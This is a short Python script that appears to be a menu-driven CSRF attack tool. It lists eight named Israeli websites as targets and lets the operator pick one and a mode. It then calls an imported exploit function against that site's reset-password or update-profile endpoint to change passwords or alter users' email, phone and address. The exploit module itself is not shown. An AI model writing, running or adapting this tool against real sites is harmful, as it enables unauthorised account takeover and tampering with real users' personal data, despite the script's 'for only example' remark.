from os import system
from payload import exploit
from platform import system as info
command = lambda model: 'cls' if model.lower() == "windows" else 'clear'
target = [
    "midea.co.il",
    "www.bug.co.il",
    "www.booknet.co.il",
    "indiebook.co.il",
    "www.togonline.co.il",
    "www.mi-il.co.il",
    "www.bookme.co.il",
    "www.modan.co.il"
]

payload = {
        1:'https://{0}/reset-password', 
        2:'https://{0}/update-profile',
}

while True:
    i = 0
    system(command(info()))
    for domain in target:
        print(f'[+] ID: ({i}) Domain: ({domain})')
        i += 1
    print()
    print(f"total domain exploit CSRF : ({i})\n\n(for only exmaple !!)\n\n")
    ID = int(input("[+] SELECT ID FROM LIST >> "))
    system(command(info()))
    print(f'[+] Domain Select attack >> {target[ID]}')
    mode = int(input("[+] SELECT MODE\n1) Password Change\n2) metadata email/phone/address..\n>> What you Want ?\t"))
    exploit(payload[mode].format(target[ID]), mode)